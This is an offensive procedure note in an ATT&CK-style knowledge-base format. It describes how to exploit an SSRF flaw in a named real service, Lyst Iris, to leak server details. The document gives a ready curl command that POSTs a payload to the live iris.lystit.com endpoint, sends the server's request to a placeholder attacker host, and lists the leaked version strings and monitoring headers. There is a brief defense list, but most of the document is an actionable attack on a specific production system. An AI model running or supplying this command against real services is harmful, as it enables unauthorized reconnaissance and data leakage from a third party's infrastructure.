---
id: proc-ssrf-leakage-lyst-001
tags:
  - ssrf
  - exfiltration
  - information-leakage
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-post-ssrf-external]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:55.483Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate Information Leakage via SSRF in Lyst Iris

## Summary

This procedure redirects the SSRF request to an attacker-controlled external server, capturing leaked details such as the internal server's IP, User-Agent, and custom headers like New Relic tracing information.

## Description

By pointing the 'images' URL to an external host under attacker control, the Lyst Iris server makes an outbound HTTP GET request, revealing its environment. This includes the Python requests library version, OS details, and monitoring headers, aiding in further reconnaissance or targeted attacks. The service's internal nature amplifies the impact of this leakage.

## Requirements

1. Attacker-controlled external server (e.g., VPS with logging)
2. Public URL for the capture endpoint
3. HTTP client for triggering the request

## Defense

Defensive measures and detection strategies:

- Strip sensitive headers from server-side requests
- Proxy outbound requests through a secure gateway with logging
- Monitor for unexpected outbound connections to unknown domains

## Objectives

1. Capture server-side request details
2. Exfiltrate environment information
3. Assess potential for broader attacks

## Instructions

### Step 1: Set Up Capture Server

**Context**: Deploy a simple HTTP server to log incoming requests (e.g., using Python's http.server or ngrok).

No command here; assume external setup.

### Step 2: Trigger External Redirect

**Context**: Submit the payload with the external URL to initiate the leak.

**Command** ([[commands/curl-post-ssrf-external]]):
```bash
curl -X POST https://iris.lystit.com/models/default/classification/color -H "Content-Type: application/json" -d '{"images": ["http://your-attacker-server.com/capture"]}'
```

> This causes the server to fetch from your endpoint. Expected output on your server: Logs showing source IP, User-Agent: python-requests/2.7.0 CPython/2.7.6 Linux/3.13.0-108-generic, and headers like X-NewRelic-ID, X-NewRelic-Transaction.

### Step 3: Analyze Captured Data

**Context**: Review logs for leaked information.

Parse the access logs for headers and IP.

> Success if internal details are visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-ssrf-external]]

## Tools Used

- [[tools/curl]]

## Tags

- ssrf
- leakage
- headers
